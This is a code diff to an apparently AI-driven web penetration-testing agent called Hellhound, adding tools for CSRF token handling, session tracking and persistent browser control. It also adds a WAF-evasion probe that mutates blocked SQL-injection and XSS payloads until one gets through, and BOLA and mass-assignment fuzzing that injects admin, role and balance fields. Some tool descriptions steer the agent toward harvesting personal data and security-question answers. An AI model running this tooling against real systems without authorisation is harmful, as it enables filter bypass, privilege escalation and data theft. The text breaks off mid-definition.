@@ -29,7 +29,7 @@ from xml.etree import ElementTree as ET
 _FLAG_TOKEN_PATTERN = re.compile(r"[A-Za-z0-9_]{2,20}\{[^{}]{3,150}\}")
 import sys
 from typing import Dict, Any, List, Optional, Callable, Set
-from urllib.parse import urlparse, urljoin, urlunparse
+from urllib.parse import urlparse, urljoin, urlunparse, parse_qsl
 
 import requests
 import urllib3
@@ -3688,6 +3688,36 @@ def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, 
         if "=" in str(data_payload) and "&" in str(data_payload) or ("=" in str(data_payload) and not "{" in str(data_payload)):
             headers["Content-Type"] = "application/x-www-form-urlencoded"
 
+    # Auto-inject a CSRF token on mutating requests when the caller didn't
+    # supply one explicitly. Many apps reject a state-changing request
+    # without a valid anti-CSRF token even when the session cookie/auth
+    # token is otherwise good -- without this the agent sees a bare 403 and
+    # misreads it as an auth/permissions problem instead of a missing
+    # token, or a login/form flow it just fetched silently fails to submit.
+    CSRF_HEADER_NAMES = ("x-csrf-token", "x-xsrf-token", "csrf-token", "x-csrftoken")
+    CSRF_FIELD_NAMES = ("_csrf", "csrf_token", "csrftoken", "authenticity_token", "__requestverificationtoken")
+    if (
+        method in ("POST", "PUT", "PATCH", "DELETE")
+        and hasattr(target, "state") and isinstance(target.state, dict)
+        and target.state.get("csrf_token")
+        and not any(k.lower() in CSRF_HEADER_NAMES for k in headers.keys())
+    ):
+        saved_csrf = target.state["csrf_token"]
+        saved_csrf_field = target.state.get("csrf_field_name")
+        if json_payload is not None and isinstance(json_payload, dict):
+            if saved_csrf_field and saved_csrf_field not in json_payload:
+                json_payload[saved_csrf_field] = saved_csrf
+            elif not any(k.lower() in CSRF_FIELD_NAMES for k in json_payload.keys()):
+                json_payload["_csrf"] = saved_csrf
+        elif data_payload is not None and isinstance(data_payload, str):
+            field = saved_csrf_field or "_csrf"
+            if f"{field}=" not in data_payload:
+                data_payload = f"{data_payload}&{field}={saved_csrf}" if data_payload else f"{field}={saved_csrf}"
+        # Also send it as a header -- many frameworks (Django, Express+csurf,
+        # Rails/ASP.NET) accept it via header regardless of body placement,
+        # and a framework that doesn't look for the header just ignores it.
+        headers["X-CSRF-Token"] = saved_csrf
+
     try:
         if json_payload is not None:
             r = requests.request(
@@ -3916,6 +3946,26 @@ def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, 
         # Clean HTML response body so styles/svgs don't crowd out the actual forms/content/comments
         body_text = r.text or ""
         is_html = "text/html" in r.headers.get("Content-Type", "").lower() or body_text.strip().startswith("<!doctype") or body_text.strip().startswith("<html")
+
+        # Auto-capture a CSRF token from this response so a LATER mutating
+        # request (a separate curl call) can present it automatically --
+        # agents routinely fetch a form/page, then POST to it without
+        # re-reading the hidden csrf field or meta tag themselves first.
+        if is_html and r.text and hasattr(target, "state") and isinstance(target.state, dict):
+            csrf_patterns = [
+                (r'''<input[^>]+name=["\'](_csrf|csrf_token|csrftoken|authenticity_token|__RequestVerificationToken)["\'][^>]+value=["\']([^"\']+)["\']''', 1, 2),
+                (r'''<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\'](_csrf|csrf_token|csrftoken|authenticity_token|__RequestVerificationToken)["\']''', 2, 1),
+                (r'''<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']''', None, 1),
+                (r'''<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf-token["\']''', None, 1),
+            ]
+            for pattern, field_group, value_group in csrf_patterns:
+                _m = re.search(pattern, r.text, re.I)
+                if _m:
+                    target.state["csrf_token"] = _m.group(value_group)
+                    target.state["csrf_field_name"] = _m.group(field_group) if field_group else "csrf_token"
+                    save_target(target)
+                    break
+
         if is_html:
             # Strip large <style> and <svg> blocks to prevent cutting off forms, hints, and test accounts
             body_text = re.sub(r'<style\b[^>]*>[\s\S]*?</style>', '<!-- [CSS style block omitted for brevity] -->', body_text, flags=re.I)
@@ -4001,6 +4051,43 @@ def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, 
                     "AUTHENTICATED SESSION ACQUIRED. Next actions: "
                     "1) Run 'spider' on the internal portal (e.g. url='https://.../portal') or systematically fetch all internal routes with 'curl'. "
                     "2) Thoroughly inspect all accessible internal staff, directory, user, and profile pages for leaked target personal information, bios, security question answers, or password reset flows."
+                )
+
+        # Session-death detection -- surface clearly when a request that
+        # carried a stored session/auth token came back unauthenticated, so
+        # the agent notices immediately instead of continuing to fuzz with a
+        # dead session and misreading the resulting 401s/empty pages as
+        # "not vulnerable" rather than "not logged in anymore".
+        if hasattr(target, "state") and isinstance(target.state, dict) and (
+            target.state.get("session_cookie") or target.state.get("auth_token") or target.state.get("cookies")
+        ):
+            session_dead = False
+            reason = None
+            if r.status_code in (401, 403):
+                session_dead = True
+                reason = f"HTTP {r.status_code}"
+            elif r.status_code in (302, 303, 307, 308):
+                loc = r.headers.get("Location", "")
+                if re.search(r'(login|signin|sign-in|auth|session[-_]?expired)', loc, re.I):
+                    session_dead = True
+                    reason = f"redirected to '{loc}'"
+            if not session_dead and r.text:
+                body_lower = r.text[:3000].lower()
+                if any(phrase in body_lower for phrase in (
+                    "session has expired", "session expired", "please log in", "please sign in",
+                    "not authenticated", "unauthenticated", "you must be logged in",
+                    "login required", "authentication required", "token has expired",
+                    "invalid or expired token", "please login to continue"
+                )):
+                    session_dead = True
+                    reason = "logout/expiry language in response body"
+            if session_dead:
+                resp_dict["session_status"] = (
+                    f"SESSION LIKELY DEAD ({reason}) despite a stored session/auth token being sent on this "
+                    f"request. Do not keep fuzzing with this session as if it's still valid -- a dead session "
+                    f"produces 401/403 or empty results on EVERYTHING, which looks like 'not vulnerable' but "
+                    f"actually means 'not logged in'. Re-run the login flow to get a fresh session before "
+                    f"continuing, or treat this engagement thread as ended."
                 )
 
         if html_comments:
@@ -4155,6 +4242,54 @@ def _execute_listener(args: Dict[str, Any], target: Target, emit: Any) -> Dict[s
         return {"status": "success", "stopped": True}
 
     return {"status": "error", "error": f"Unknown action '{action}'. Use 'start', 'poll', or 'stop'."}
+
+
+def _execute_browser_control(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    """
+    Generic interactive browser control, backed by a PERSISTENT per-target
+    Playwright page (hellhound.core.browser_control) — unlike spider/gowitness,
+    which launch-and-tear-down a browser inside one module.run() call, this
+    tool's page stays alive ACROSS separate tool calls within the session, so
+    a multi-step flow (goto a login page, fill credentials, click submit,
+    then poke at the now-authenticated page) can be driven one action at a
+    time, each action its own tool call the model can reason about in
+    between.
+    """
+    from hellhound.core import browser_control
+
+    action = (args.get("action") or "").strip().lower()
+    if not action:
+        return {
+            "status": "error",
+            "error": "browser_control requires an 'action': goto, click, fill, eval_js, get_storage, get_cookies, get_network_log, screenshot, or close.",
+        }
+
+    key = target.name if (target and target.name) else "default"
+    result = browser_control.run_browser_action(key, action, args)
+
+    # Mirror curl's behavior: whatever cookies the browser is holding after
+    # this action get folded into target.state, so curl/other tools (and a
+    # later browser_control call) can reuse a session the browser itself
+    # established (e.g. after a JS-driven login redirect curl can't follow).
+    if result.get("status") == "success" and action in ("goto", "click", "fill", "get_cookies") and hasattr(target, "state") and isinstance(target.state, dict):
+        try:
+            cookie_result = browser_control.run_browser_action(key, "get_cookies", {}, timeout=15)
+            cookies = cookie_result.get("cookies") if cookie_result.get("status") == "success" else None
+            if cookies:
+                if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
+                    target.state["cookies"] = {}
+                for c in cookies:
+                    cname, cval = c.get("name"), c.get("value")
+                    if not cname or cval is None:
+                        continue
+                    target.state["cookies"][cname] = cval
+                    if any(x in cname.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
+                        target.state["session_cookie"] = f"{cname}={cval}"
+                save_target(target)
+        except Exception:
+            pass  # cookie sync is best-effort and must never break the actual browser action
+
+    return result
 
 
 # Cookie/value names that are well-known opaque server-side session
@@ -5058,6 +5193,340 @@ def _execute_sqlmap_scan(args: Dict[str, Any], target: Target, emit: Any) -> Dic
     }
 
 
+# ──────────────────────────────────────────────────────────────────────────
+# Adaptive WAF evasion: mutation-feedback loop
+# ──────────────────────────────────────────────────────────────────────────
+#
+# WAFbuster's active_trigger() only ever sends 3 fixed, unmutated payloads
+# to FINGERPRINT whether a WAF exists — it was never meant to, and doesn't,
+# try to get a genuinely malicious payload PAST one. This is the other half:
+# given a payload that already got blocked, try a bounded, ordered list of
+# mutations and stop at the FIRST one that gets through, rather than firing
+# every mutation at the target regardless (that would be exactly the
+# "reach for a tool/noise randomly" behavior the rest of this file
+# deliberately avoids). Each mutation is cheap and well-known, not a fuzzer —
+# this is for the specific, common case of "my payload is right but a WAF
+# in front of the app is eating it."
+
+def _waf_mutations(payload: str, payload_type: str) -> List[Dict[str, str]]:
+    import urllib.parse as _up
+
+    muts: List[Dict[str, str]] = [{"name": "baseline (unmutated)", "value": payload}]
+
+    # 1. Single URL-encoding of the whole payload.
+    muts.append({"name": "url_encode_once", "value": _up.quote(payload, safe="")})
+    # 2. Double URL-encoding — classic WAF bypass since many WAFs decode once.
+    muts.append({"name": "url_encode_twice", "value": _up.quote(_up.quote(payload, safe=""), safe="")})
+    # 3. Alternating case on every alphabetic character.
+    muts.append({"name": "case_alternate", "value": "".join(
+        c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)
+    )})
+    # 4. Spaces -> URL-encoded tab (%09) — some regex-based WAFs key on a
+    #    literal space between keywords and miss other whitespace chars.
+    if " " in payload:
+        muts.append({"name": "space_to_tab", "value": payload.replace(" ", "%09")})
+        muts.append({"name": "space_to_newline", "value": payload.replace(" ", "%0a")})
+    # 5. Trailing null-byte — some older/legacy WAF rule engines stop
+    #    matching at %00 even though the backend parser doesn't.
+    muts.append({"name": "trailing_null_byte", "value": payload + "%00"})
+
+    if payload_type == "sqli" or re.search(r'\b(union|select|or|and)\b', payload, re.I):
+        # 6. Inline SQL comments splitting keywords — bypasses WAFs doing a
+        #    literal substring match on "UNION SELECT" etc.
+        def _inline_comment_sqli(p: str) -> str:
+            return re.sub(
+                r'\b(union|select|from|where|and|or|insert|update|delete)\b',
+                lambda m: m.group(1)[:len(m.group(1)) // 2] + "/**/" + m.group(1)[len(m.group(1)) // 2:],
+                p, flags=re.I,
+            )
+        muts.append({"name": "sql_inline_comment_split", "value": _inline_comment_sqli(payload)})
+        # 7. Keyword case-mix specifically on SQL keywords (UnIoN SeLeCt).
+        def _mixed_case_sqli(p: str) -> str:
+            return re.sub(
+                r'\b(union|select|from|where|and|or|insert|update|delete)\b',
+                lambda m: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(m.group(1))),
+                p, flags=re.I,
+            )
+        muts.append({"name": "sql_mixed_case_keywords", "value": _mixed_case_sqli(payload)})
+
+    if payload_type == "xss" or re.search(r'<\s*script|on\w+\s*=', payload, re.I):
+        # 8. HTML entity-encode angle brackets — browsers decode entities in
+        #    attribute/text context; some WAFs only pattern-match raw '<'.
+        muts.append({"name": "html_entity_angle_brackets", "value": payload.replace("<", "&lt;").replace(">", "&gt;")})
+        # 9. Hex HTML entity encoding of angle brackets (a different
+        #    encoding path than decimal entities — some filters miss it).
+        muts.append({"name": "hex_html_entity_angle_brackets", "value": payload.replace("<", "&#x3C;").replace(">", "&#x3E;")})
+
+    return muts
+
+
+_WAF_BLOCK_PHRASES = (
+    "blocked", "forbidden", "access denied", "request rejected", "security policy",
+    "not acceptable", "attack detected", "malicious request", "waf", "firewall",
+    "mod_security", "modsecurity", "incapsula", "cloudflare", "unauthorized activity",
+    "your request has been blocked", "suspicious activity",
+)
+
+
+def _looks_waf_blocked(status_code: int, body: str) -> bool:
+    if status_code in (403, 406, 429, 501):
+        return True
+    body_low = (body or "")[:2000].lower()
+    return any(p in body_low for p in _WAF_BLOCK_PHRASES)
+
+
+def _execute_waf_evasion_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    """
+    Given a payload that already got blocked (by a WAF, not by the app's
+    own logic — confirm that distinction yourself before reaching for this),
+    try a bounded, ordered list of well-known encoding/case/whitespace
+    mutations against the SAME endpoint and stop at the first one that gets
+    through. Returns every attempt tried so the model can see exactly what
+    was blocked and what wasn't, instead of silently picking one. This does
+    NOT confirm the underlying vuln still fires with the mutated payload —
+    that still needs its own confirmation step (reflected in response,
+    sqlmap, OOB callback, etc.) per the non-determinism/false-positive
+    discipline every other tool in this file follows.
+    """
+    url = (args.get("url") or "").strip()
+    payload = args.get("payload")
+    if not url or not payload:
+        return {"error": "waf_evasion_probe requires both 'url' and the 'payload' that already got blocked."}
+    param = (args.get("param") or "test").strip()
+    method = (args.get("method") or "GET").upper()
+    payload_type = (args.get("payload_type") or "generic").strip().lower()
+
+    auth_opts = _target_auth_options(target)
+    headers = {"User-Agent": "Hellhound/1.0"}
+    headers.update(auth_opts.get("auth_headers", {}))
+    cookies = auth_opts.get("auth_cookies", {})
+
+    mutations = _waf_mutations(str(payload), payload_type)[:9]  # hard cap — bounded, not a fuzzer
+    attempts = []
+    winning = None
+
+    for mut in mutations:
+        try:
+            if method == "GET":
+                sep = "&" if "?" in url else "?"
+                probe_url = f"{url}{sep}{param}={mut['value']}"
+                r = requests.get(probe_url, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
+            else:
+                probe_url = url
+                headers_post = dict(headers)
+                headers_post.setdefault("Content-Type", "application/x-www-form-urlencoded")
+                r = requests.request(method, probe_url, headers=headers_post, cookies=cookies,
+                                      data=f"{param}={mut['value']}", timeout=10, verify=False, allow_redirects=False)
+            blocked = _looks_waf_blocked(r.status_code, r.text)
+            attempts.append({
+                "mutation": mut["name"], "payload_sent": mut["value"],
+                "status_code": r.status_code, "blocked": blocked,
+            })
+            if not blocked:
+                winning = mut["name"]
+                break
+        except Exception as e:
+            attempts.append({"mutation": mut["name"], "payload_sent": mut["value"], "error": str(e)})
+
+    return {
+        "url": url,
+        "param": param,
+        "method": method,
+        "original_payload": payload,
+        "attempts": attempts,
+        "bypass_found": winning is not None,
+        "winning_mutation": winning,
+        "note": (
+            "A mutation getting a non-blocked response means it got PAST the WAF — it does NOT by itself "
+            "confirm the vulnerability still triggers. Re-verify impact with this exact mutated payload "
+            "(reflection check, sqlmap_scan, OOB listener, etc.) before recording a finding."
+            if winning else
+            "None of the tried mutations got past this WAF. Consider a different injection point, a slower "
+            "delivery path (out-of-band), or that this may not be bypassable with encoding-level tricks alone."
+        ),
+    }
+
+
+# ──────────────────────────────────────────────────────────────────────────
+# Schema-driven BOLA / mass-assignment fuzzing
+# ──────────────────────────────────────────────────────────────────────────
+#
+# Consumes the endpoint/param table spider.py's probe_openapi() (and
+# ordinary crawling) already builds into target.state["spider_intel"]
+# instead of asking the model to guess endpoints blind. Two checks, each
+# capped and signal-gated rather than blasting every endpoint:
+#
+#   BOLA (horizontal privilege escalation): endpoints with a numeric ID in
+#   the path or an id-like query param get ONE adjacent-ID mutation tried
+#   (id+1 / id-1) with the SAME session, comparing against the baseline.
+#
+#   Mass assignment: POST/PUT/PATCH endpoints with known body params get a
+#   single request carrying the legitimate params PLUS a batch of common
+#   privilege/financial fields the client was never supposed to be able to
+#   set, checking whether the server echoes/accepts them.
+#
+# Both only ever report a SIGNAL for the model to confirm — consistent with
+# this file's non-determinism/false-positive discipline, this tool does not
+# call record_finding itself.
+
+_ID_PATH_RE = re.compile(r'^\d+$')
+_UUID_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
+_ID_PARAM_NAME_RE = re.compile(r'(^id$|_id$|^uid$|^uuid$)', re.I)
+
+_MASS_ASSIGNMENT_FIELDS: Dict[str, Any] = {
+    "role": "admin", "isAdmin": True, "is_admin": True, "admin": True,
+    "permissions": ["admin"], "privilege": "admin", "account_type": "admin",
+    "verified": True, "is_verified": True, "premium": True,
+    "balance": 999999, "price": 0, "discount": 100, "approved": True,
+}
+
+
+def _execute_schema_fuzz(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {}) or {}
+    endpoints = spider_intel.get("endpoints", []) if isinstance(spider_intel, dict) else []
+    if not endpoints:
+        return {"error": "No endpoints in spider_intel yet — run 'spider' first so this has a param table to work from."}
+
+    max_checks = max(1, min(int(args.get("max_checks", 8) or 8), 15))  # bounded — not a blind fuzzer
+    checks_do = (args.get("checks") or "bola,mass_assignment").lower()
+
+    auth_opts = _target_auth_options(target)
+    headers = {"User-Agent": "Hellhound/1.0"}
+    headers.update(auth_opts.get("auth_headers", {}))
+    cookies = auth_opts.get("auth_cookies", {})
+
+    bola_results = []
+    mass_assignment_results = []
+
+    # ---- BOLA: adjacent-ID swap on endpoints with a path/query ID ----
+    if "bola" in checks_do:
+        bola_candidates = []
+        for ep in endpoints:
+            url = ep.get("url", "")
+            if not url:
+                continue
+            try:
+                parsed = urlparse(url)
+            except Exception:
+                continue
+            segs = parsed.path.split("/")
+            found = False
+            for i, seg in enumerate(segs):
+                if _ID_PATH_RE.match(seg):
+                    try:
+                        orig_int = int(seg)
+                    except Exception:
+                        continue
+                    mutated_int = orig_int + 1 if orig_int < 10 ** 9 else orig_int - 1
+                    new_segs = list(segs)
+                    new_segs[i] = str(mutated_int)
+                    mutated_url = urlunparse((parsed.scheme, parsed.netloc, "/".join(new_segs), parsed.params, parsed.query, parsed.fragment))
+                    bola_candidates.append({"url": url, "mutated_url": mutated_url, "method": ep.get("method", "GET"), "kind": "path_numeric_id"})
+                    found = True
+                    break
+                if _UUID_RE.match(seg):
+                    # Can't guess a valid adjacent UUID — flag as needing a
+                    # manually-supplied second ID rather than silently skip.
+                    bola_candidates.append({"url": url, "mutated_url": None, "method": ep.get("method", "GET"), "kind": "path_uuid_unguessable"})
+                    found = True
+                    break
+            if not found and parsed.query:
+                for pname, pval in parse_qsl(parsed.query):
+                    if _ID_PARAM_NAME_RE.search(pname) and pval.strip():
+                        if _ID_PATH_RE.match(pval.strip()):
+                            mutated_val = str(int(pval) + 1)
+                            mutated_url = url.replace(f"{pname}={pval}", f"{pname}={mutated_val}")
+                            bola_candidates.append({"url": url, "mutated_url": mutated_url, "method": ep.get("method", "GET"), "kind": f"query_param_id ({pname})"})
+                        else:
+                            bola_candidates.append({"url": url, "mutated_url": None, "method": ep.get("method", "GET"), "kind": f"query_param_id_unguessable ({pname})"})
+                        break
+
+        for cand in bola_candidates[:max_checks]:
+            if not cand["mutated_url"]:
+                bola_results.append({**cand, "tested": False, "note": "No numeric ID to mutate automatically — try this one manually with a second known object ID (e.g. another test account)."})
+                continue
+            try:
+                r_base = requests.request(cand["method"], cand["url"], headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
+                r_mut = requests.request(cand["method"], cand["mutated_url"], headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
+                suspicious = (
+                    r_mut.status_code == 200
+                    and r_base.status_code == 200
+                    and len(r_mut.text or "") > 20
+                    and r_mut.text != r_base.text
+                )
+                bola_results.append({
+                    **cand, "tested": True,
+                    "baseline_status": r_base.status_code, "mutated_status": r_mut.status_code,
+                    "baseline_body_len": len(r_base.text or ""), "mutated_body_len": len(r_mut.text or ""),
+                    "possible_bola": suspicious,
+                    "note": (
+                        "Mutated ID returned 200 with a DIFFERENT body using the SAME session — possible "
+                        "horizontal privilege escalation. Manually confirm the returned object actually "
+                        "belongs to a different user/account before recording a finding (it may simply be a "
+                        "different but still-yours resource, e.g. a second of your own orders)."
+                        if suspicious else "No signal — same status/body pattern, or mutated ID was rejected."
+                    ),
+                })
+            except Exception as e:
+                bola_results.append({**cand, "tested": False, "error": str(e)})
+
+    # ---- Mass assignment: inject extra privileged fields into one write ----
+    if "mass_assignment" in checks_do:
+        ma_candidates = [
+            ep for ep in endpoints
+            if ep.get("method", "GET").upper() in ("POST", "PUT", "PATCH")
+            and (ep.get("params") or ep.get("params_detail"))
+        ][:max_checks]
+
+        for ep in ma_candidates:
+            url = ep.get("url", "")
+            method = ep.get("method", "POST").upper()
+            legit_params = ep.get("params") or []
+            body = {p: "test" for p in legit_params if p}
+            body.update(_MASS_ASSIGNMENT_FIELDS)
+            try:
+                r = requests.request(method, url, headers={**headers, "Content-Type": "application/json"},
+                                      cookies=cookies, json=body, timeout=10, verify=False, allow_redirects=False)
+                accepted_fields = []
+                if r.status_code in (200, 201, 202, 204):
+                    try:
+                        resp_json = r.json()
+                        flat = _flatten_json_dict(resp_json) if isinstance(resp_json, (dict, list)) else {}
+                        for extra_field in _MASS_ASSIGNMENT_FIELDS:
+                            for fk, fv in flat.items():
+                                if fk.split(".")[-1].lower() == extra_field.lower() and fv == _MASS_ASSIGNMENT_FIELDS[extra_field]:
+                                    accepted_fields.append(extra_field)
+                    except Exception:
+                        pass
+                mass_assignment_results.append({
+                    "url": url, "method": method, "status_code": r.status_code,
+                    "injected_fields": list(_MASS_ASSIGNMENT_FIELDS.keys()),
+                    "fields_echoed_back_as_sent": accepted_fields,
+                    "possible_mass_assignment": bool(accepted_fields) or r.status_code in (200, 201, 202),
+                    "note": (
+                        f"Response echoed back {accepted_fields} exactly as injected — strong signal the server "
+                        f"bound these client-supplied fields directly. Confirm by checking actual effect (does a "
+                        f"follow-up GET on this object show the privilege/balance change?) before recording."
+                        if accepted_fields else
+                        f"Got {r.status_code} without validation rejecting the extra fields by name — body didn't "
+                        f"clearly echo them though. Weaker signal; check manually whether any field actually took effect."
+                        if r.status_code in (200, 201, 202) else
+                        "Request was rejected — no mass-assignment signal here."
+                    ),
+                })
+            except Exception as e:
+                mass_assignment_results.append({"url": url, "method": method, "error": str(e)})
+
+    return {
+        "bola": bola_results,
+        "mass_assignment": mass_assignment_results,
+        "summary": (
+            f"BOLA: {sum(1 for b in bola_results if b.get('possible_bola'))} suspicious / {len(bola_results)} tested. "
+            f"Mass assignment: {sum(1 for m in mass_assignment_results if m.get('possible_mass_assignment'))} suspicious / {len(mass_assignment_results)} tested."
+        ),
+    }
+
+
 def _execute_hydra(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
     """Execute Hydra parameter and logic flaw analysis across discovered endpoints."""
     from hellhound.core.engine import HellhoundEngine
@@ -5137,6 +5606,96 @@ def _execute_cloudscout(args: Dict[str, Any], target: Target, emit: Any) -> Dict
         }
     except Exception as e:
         return {"url": url, "error": f"CloudScout error: {e}"}
+
+
+def _execute_js_static_analysis(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    """
+    Reconstruct and statically audit this target's client-side JS: find and
+    unpack exposed sourcemaps (BlobUnpacker — recovers original file
+    names/structure, hunts minified bundles for hardcoded secrets/API keys/
+    endpoints) THEN run the recovered source through signature-based sink
+    detection (SourceAuditor — eval()/dangerouslySetInnerHTML, hardcoded
+    admin/role checks, localStorage misuse, hardcoded credentials, internal
+    URLs, client-side SQL string concatenation, insecure transport, hidden
+    admin/debug routes).
+
+    Both of these existed in the codebase as fully-built, working modules
+    that were never wired into the tool registry — not a new capability
+    being invented here, just connecting two pieces that already worked
+    standalone. Chained together because SourceAuditor's real value (sink
+    detection on ACTUAL recovered source, not minified noise) depends on
+    BlobUnpacker having found something to feed it; calling them separately
+    would just mean manually passing one's output into the other's options
+    every time.
+    """
+    from hellhound.core.engine import HellhoundEngine
+    url = args.get("url") or target.name
+    if not url.startswith(("http://", "https://")):
+        url = f"https://{url}"
+
+    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
+    base_opts = {"spider_intel": spider_intel}
+    base_opts.update(_target_auth_options(target))
+
+    engine = HellhoundEngine()
+
+    try:
+        blob_res = engine.run_single("blobunpacker", url, options=dict(base_opts), emit=emit)
+    except Exception as e:
+        return {"url": url, "error": f"BlobUnpacker error: {e}"}
+
+    blob_intel = blob_res.get("intel", {}) if isinstance(blob_res, dict) else {}
+    reconstructed = blob_intel.get("reconstructed", [])
+    secrets = blob_intel.get("secrets", [])
+    new_endpoints = blob_intel.get("new_endpoints", [])
+
+    if not reconstructed and not blob_intel.get("minified_content"):
+        # Nothing to statically audit — no point calling SourceAuditor on
+        # an empty source tree, that's just a wasted request/turn.
+        return {
+            "url": url,
+            "status": "no_sourcemaps_or_bundles_found",
+            "secrets_found_in_minified_js": len(secrets),
+            "secrets": secrets[:25],
+            "new_endpoints_found": len(new_endpoints),
+            "new_endpoints": new_endpoints[:50],
+            "note": "No sourcemaps recovered and no JS bundles reachable to statically audit — BlobUnpacker's own direct secret/endpoint scan of whatever JS it DID fetch is above, if anything.",
+        }
+
+    # use_ai defaults OFF — SourceAuditor's optional LLM-verification pass
+    # calls its own separately-configured AI provider (gemini by default)
+    # to cut false positives on sink findings; left opt-in so this doesn't
+    # silently start making extra model calls nobody asked for.
+    sa_opts = {
+        "blobunpacker_intel": blob_intel,
+        "use_ai": bool(args.get("use_ai", False)),
+    }
+    try:
+        sa_res = engine.run_single("sourceauditor", url, options=sa_opts, emit=emit)
+    except Exception as e:
+        return {
+            "url": url,
+            "error": f"SourceAuditor error: {e}",
+            "secrets_found_in_minified_js": len(secrets),
+            "new_endpoints_found": len(new_endpoints),
+        }
+
+    sa_intel = sa_res.get("intel", {}) if isinstance(sa_res, dict) else {}
+    # SourceAuditor's own key is "vulnerabilities", not "findings" — checked
+    # its actual return shape rather than assuming.
+    findings = sa_intel.get("vulnerabilities", []) if isinstance(sa_intel, dict) else []
+
+    return {
+        "url": url,
+        "files_recovered": len(reconstructed),
+        "secrets_found": len(secrets),
+        "secrets": secrets[:25],
+        "new_endpoints_found": len(new_endpoints),
+        "new_endpoints": new_endpoints[:50],
+        "static_analysis_findings": len(findings),
+        "findings": findings[:50],
+        "risk_score": sa_intel.get("risk_score", blob_intel.get("risk_score", 0)),
+    }
 
 
 def _execute_transport_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
@@ -7092,7 +7651,18 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
     ),
     "curl": ToolSpec(
         name="curl",
-        description="Fetch HTTP response headers and body preview for an endpoint with standard BugBounty identity headers. Supports GET, POST, PUT, DELETE with custom headers, cookies, JSON objects, and string payloads.",
+        description=(
+            "Fetch HTTP response headers and body preview for an endpoint with standard BugBounty identity "
+            "headers. Supports GET, POST, PUT, DELETE with custom headers, cookies, JSON objects, and string "
+            "payloads. Session handling is automatic -- you don't need to manage it yourself: any session "
+            "cookie or auth token already captured for this target is auto-attached; a CSRF token seen on a "
+            "GET (hidden _csrf/csrf_token input or a <meta name=\"csrf-token\"> tag) is auto-captured and then "
+            "auto-injected (header + body field) into your next POST/PUT/PATCH/DELETE unless you pass your "
+            "own; and if a stored session/token is sent but the response looks logged-out (401/403, a "
+            "redirect to a login page, or 'please log in'/'session expired' text), the result includes a "
+            "'session_status' field flagging the session as dead -- don't keep fuzzing on one that's flagged, "
+            "re-run the login flow first."
+        ),
         parameters={
             "type": "object",
             "properties": {
@@ -7188,6 +7758,38 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
         },
         executor=_execute_listener
     ),
+    "browser_control": ToolSpec(
+        name="browser_control",
+        description=(
+            "Drive a REAL, PERSISTENT headless browser (Chromium via Playwright) one action at a time, for "
+            "the cases curl can't handle: a JS-driven login/redirect flow, a page that only renders its "
+            "content client-side, an MFA/consent click-through, or reading values out of localStorage/"
+            "sessionStorage. The page stays alive ACROSS separate calls to this tool within the session — "
+            "goto a login page, fill the username/password fields, click submit, then goto an internal page, "
+            "all as separate tool calls that build on each other, exactly like a human clicking through a "
+            "browser. Cookies the browser picks up are automatically folded into the shared target session, "
+            "so curl/other tools can reuse whatever the browser just authenticated. Use curl for plain HTTP "
+            "recon — reach for this only when JS execution or real click/fill interaction is actually needed."
+        ),
+        parameters={
+            "type": "object",
+            "properties": {
+                "action": {
+                    "type": "string",
+                    "description": "One of: 'goto' (navigate), 'click' (click an element), 'fill' (type into a field), 'eval_js' (run JavaScript in the page and return its result), 'get_storage' (read localStorage + sessionStorage), 'get_cookies' (read all cookies), 'get_network_log' (requests/responses seen so far), 'screenshot' (base64 PNG), or 'close' (tear the browser down for this target).",
+                },
+                "url": {"type": "string", "description": "Required for action='goto'. Full URL to navigate to."},
+                "selector": {"type": "string", "description": "Required for 'click'/'fill'. A CSS selector, e.g. '#username', 'button[type=submit]'."},
+                "value": {"type": "string", "description": "Required for 'fill'. The text to type into the selected field."},
+                "script": {"type": "string", "description": "Required for 'eval_js'. JavaScript to evaluate in the page context, e.g. 'document.title' or '() => window.__APP_STATE__'."},
+                "wait_for": {"type": "string", "description": "Optional, for 'goto'. One of 'load' (default), 'domcontentloaded', 'networkidle', or 'commit'."},
+                "full_page": {"type": "boolean", "description": "Optional, for 'screenshot'. Capture the full scrollable page instead of just the viewport. Default false."},
+                "timeout": {"type": "number", "description": "Seconds to wait for the action before giving up. Default 15.", "default": 15}
+            },
+            "required": ["action"]
+        },
+        executor=_execute_browser_control
+    ),
     "spider": ToolSpec(
         name="spider",
         description="Crawl target web application to discover endpoints, URL parameters, form fields, and JavaScript assets. Supports authenticated crawling with session cookies or Authorization headers.",
@@ -7279,6 +7881,53 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
             "required": ["url"]
         },
         executor=_execute_sqlmap_scan
+    ),
+    "waf_evasion_probe": ToolSpec(
+        name="waf_evasion_probe",
+        description=(
+            "When a payload you already tried got blocked (403/firewall page/generic 'blocked' response — "
+            "NOT the app's own validation error), try a bounded set of well-known WAF-bypass mutations "
+            "(double URL-encoding, case alternation, inline SQL comments, alternate whitespace, HTML entity "
+            "encoding, etc.) against the same endpoint and stop at the first one that gets through. Returns "
